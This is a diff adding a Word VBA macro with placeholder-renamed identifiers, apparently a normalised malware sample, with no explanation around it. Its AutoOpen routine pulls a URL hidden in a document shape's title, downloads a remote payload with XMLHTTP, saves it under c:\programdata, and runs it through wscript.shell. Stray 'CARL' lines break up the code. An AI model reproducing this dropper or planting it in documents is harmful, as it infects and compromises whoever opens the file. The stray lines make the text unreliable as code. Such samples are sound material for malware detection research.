@@ -1,0 +1,57 @@
+Sub aFUNC1a(aVAR1a)
+aVAR2a = aFUNC6a("hello")
+Open aVAR2a For Output As #1
+Print #1, aVAR1a
+Close #1
+End Sub
+Sub AutoOpen()
+Dim aVAR3a As New aCLASS1a
+aVAR1a = aVAR3a.aFUNC11a()
+aFUNC1a aFUNC7a(aVAR1a)
+aFUNC2a aFUNC9a(0) + " " + aFUNC6a("hello") + " " +aFUNC9a(2)
+End Sub
+Sub aFUNC2a(aVAR5a)
+Set aVAR4a = aFUNC10a()
+With aVAR4a
+.exec (aVAR5a)
+End With
+End Sub
+Function aFUNC4a(aVAR6a, aVAR7a)
+aFUNC4a = Split(aVAR6a, aVAR7a)
+End Function
+CARL
+Function aFUNC5a()
+aFUNC5a = 8 - 7
+End Function
+Function aFUNC6a(aVAR8a)
+aFUNC6a = "c:\programdata\ebf45." & aVAR8a
+End Function
+Function aFUNC7a(aVAR9a)
+aFUNC7a = StrConv(aVAR9a, vbUnicode)
+End Function
+Function aFUNC8a()
+With ActiveDocument.Shapes(aFUNC5a)
+aFUNC8a = .Title
+End With
+End Function
+Sub aFUNC3a()
+End Sub
+Function aFUNC9a(aVAR10a)
+c143c = aFUNC4a(aFUNC8a(), "1111111111")
+aVAR11a = c143c(aVAR10a)
+aFUNC9a = aVAR11a
+End Function
+Function aFUNC10a()
+Set aFUNC10a = CreateObject("wscript.shell")
+End Function
+CARL
+Function aFUNC11a()
+Dim aVAR12a As Object
+Set aVAR12a = CreateObject("Microsoft.XMLHTTP")
+aVAR13a = aFUNC9a(1)
+aVAR12a.Open "GET", aVAR13a, False
+aVAR12a.Send
+aFUNC11a = aVAR12a.responsebody
+End Function
+Function aFUNC12a(aVAR14a)
+End Function
